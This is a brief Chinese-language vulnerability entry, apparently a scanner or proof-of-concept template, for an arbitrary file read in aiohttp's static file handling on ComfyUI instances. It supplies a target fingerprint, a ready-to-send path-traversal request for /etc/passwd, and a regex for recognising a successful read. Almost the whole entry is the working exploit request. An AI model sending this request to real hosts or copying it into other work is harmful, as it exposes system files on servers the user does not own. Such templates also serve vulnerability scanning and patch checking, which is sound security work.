# aiohttp-static-任意文件读取漏洞

aiohttp-static ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title=="ComfyUI"`
- **请求**：`GET /static/./../../../../../../../../etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$